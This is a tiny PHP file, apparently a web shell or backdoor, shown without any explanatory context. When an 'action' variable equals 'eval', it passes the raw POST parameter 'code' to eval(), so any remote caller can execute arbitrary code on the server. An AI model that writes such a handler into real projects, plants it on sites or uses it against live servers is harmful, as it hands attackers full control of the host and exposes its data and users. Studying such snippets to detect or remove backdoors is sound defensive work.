<?php
if($action === "eval")
{
    $code = $_POST["code"];
    eval($code);
}

?>